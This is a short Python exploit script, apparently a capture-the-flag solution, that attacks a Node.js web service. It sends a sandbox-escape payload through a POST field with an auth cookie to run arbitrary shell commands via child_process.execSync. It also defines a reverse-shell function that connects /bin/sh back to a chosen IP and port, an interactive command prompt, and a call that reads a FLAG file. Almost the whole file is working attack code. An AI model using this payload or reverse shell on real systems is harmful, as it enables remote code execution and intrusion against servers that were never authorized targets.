import requests

def load_env():
    env = {}

    with open('./.env', 'r') as h:
        for line in h.readlines():
            var, val = line.strip().split('=')

            env[var] = val
    
    return env

ENV = load_env()
URL = ENV['URL']
AUTH_TOKEN = ENV['AUTH_TOKEN']

def bash_exec(payload: str) -> str:
    res = requests.post(URL, data={
        "data": f"this.constructor.constructor('return this.process')().mainModule.require('child_process').execSync('{payload}').toString()"
    }, cookies={
        'AUTH_TOKEN': AUTH_TOKEN
    })

    return res.text

def reverse_shell(ip: str, port: int):
    function = "function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); }"
    print(bash_exec(f"node -e \\'sh = child_process.spawn(\"/bin/sh\"); net.connect({port}, \"{ip}\", {function});\\'"))

def interactive():
    while (payload := input('net # ')).lower() != 'exit':
        print(bash_exec(payload))

if __name__ == '__main__':
    print(bash_exec("cat /home/k1dd13/FLAG"))
